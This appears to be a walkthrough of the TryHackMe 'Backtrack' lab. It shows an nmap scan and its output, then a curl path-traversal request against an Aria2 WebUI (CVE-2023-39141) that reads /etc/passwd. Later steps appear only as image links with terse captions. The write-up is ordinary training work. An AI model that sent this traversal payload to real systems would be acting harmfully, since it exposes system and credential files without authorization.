# <div align="center">[Backtrack TryHackMe Walkthrough]()</div>
<div align="center"></div>
<div align="center">
  
</div>

## Initial Reconnaissance
I started with a standard nmap scan to enumerate services and versions on the target.

```
nmap -sV -sC 10.48.132.202
```
The scan output I observed was:
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-title: Apache Tomcat/8.5.93
|_http-favicon: Apache Tomcat
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sun, 09 Nov 2025 14:11:57 GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
```
From the scan I noted three open ports and services:
* 22/tcp - OpenSSH 8.2p1 (standard SSH)
* 8080/tcp - Apache Tomcat 8.5.93 (default Tomcat web page)
* 8888/tcp - HTTP service responding with an Aria2 WebUI page (nmap's fingerprint shows Aria2 WebUI)

### Adding to Host file

Immediately after the scan I added a hosts entry so I could reference the machine by name (backtrack.thm) in later requests:

echo "10.48.132.202 backtrack.thm" | sudo tee -a /etc/hosts


(This appends the IP and hostname to /etc/hosts so I can use backtrack.thm in place of the IP address.)

## Vulnerability Reasearch
I focused on the web UI on port 8888. After inspecting the web interface I recognized it as Aria2 WebUI, which has a known path traversal vulnerability tracked as [CVE-2023–39141](https://security.snyk.io/vuln/SNYK-JS-WEBUIARIA2-6322148).
I tested a simple proof-of-concept path-traversal request using curl (exact command I ran):
```
curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```
The curl request returned the contents of /etc/passwd. This confirms the Aria2 WebUI instance is vulnerable to a directory traversal (path-traversal) allowing access to files outside the webroot.

user pass

<img width="1305" height="863" alt="image" src="https://github.com/user-attachments/assets/7e69a710-2492-411b-bd96-d686ffd52c22" />

---

<img width="1530" height="271" alt="image" src="https://github.com/user-attachments/assets/7a7584f4-b92a-4468-b5b1-a631647e48fc" />

login

<img width="789" height="325" alt="image" src="https://github.com/user-attachments/assets/c3d10e36-c200-40b5-8669-dbde5d77a6cb" />

403

<img width="1420" height="465" alt="image" src="https://github.com/user-attachments/assets/8209b572-7693-4a4f-9aea-131d138f8ae0" />


server status 

<img width="1915" height="898" alt="image" src="https://github.com/user-attachments/assets/fdb2a597-b9c5-4ab4-894a-a7c8a6d3a431" />


exploit 

<img width="1402" height="73" alt="image" src="https://github.com/user-attachments/assets/725e1f8f-ebe7-412d-b961-772160f5e633" />



<img width="1535" height="269" alt="image" src="https://github.com/user-attachments/assets/8bd90f00-8fc5-4c2d-a818-2e1d198f5e04" />
